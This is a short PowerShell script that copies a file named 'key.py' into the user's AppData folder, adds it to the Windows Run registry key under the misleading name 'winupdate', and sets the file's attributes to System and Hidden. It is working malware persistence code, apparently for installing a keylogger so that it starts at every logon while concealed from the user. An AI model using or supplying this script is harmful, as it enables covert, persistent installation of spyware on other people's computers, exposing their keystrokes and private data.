# Set the file name as your .exe
$strFileName = "key.py"

$APPDATA = "$env:APPDATA"
$strScriptPath = $MyInvocation.MyCommand.Path; $strDirScriptPath = Split-Path $strScriptPath
Set-Location -Path $strDirScriptPath

If (test-path "$APPDATA\$strFileName") {Remove-Item "$APPDATA\$strFileName" -Force}
Copy-Item $strFileName $APPDATA -Force

New-ItemProperty -path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -name winupdate -PropertyType String -value $APPDATA\$strFileName -Force
$objGetFile=Get-Item $APPDATA\$strFileName; $objGetFile.Attributes = 'System, Hidden'
